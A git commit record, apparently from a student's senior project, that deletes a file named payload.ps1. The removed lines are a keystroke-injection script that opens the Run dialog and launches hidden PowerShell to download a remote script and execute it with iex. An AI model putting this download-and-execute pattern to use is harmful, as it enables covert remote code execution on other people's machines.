c8046640073ef984113081e278f3c61c7df19117
Cuellarg07 <148662827+Cuellarg07@users.noreply.github.com>
2025-05-05 00:47:32 -0500

    Delete payload.ps1

--- payload.ps1
+++
@@ -1,5 +0,0 @@
-DELAY 1000
-GUI r
-DELAY 500
-STRING powershell -w hidden -nop -c "$s='https://raw.githubusercontent.com/Cuellarg07/seniorproject/main/payload.ps1';iex(New-Object Net.WebClient).DownloadString($s)"
-ENTER
